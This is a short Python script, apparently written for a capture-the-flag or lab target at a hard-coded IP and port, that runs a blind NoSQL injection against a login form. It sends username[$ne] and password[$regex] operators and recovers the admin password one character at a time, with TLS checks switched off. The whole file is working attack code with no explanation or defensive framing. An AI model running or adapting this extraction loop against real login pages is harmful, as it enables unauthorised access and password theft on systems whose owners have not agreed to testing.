import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://206.189.18.74:32469/login"

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='username[$ne]=toto&password[$regex]=^%s.{2}' % (password + c)
            r = requests.post(u, data = payload,  verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
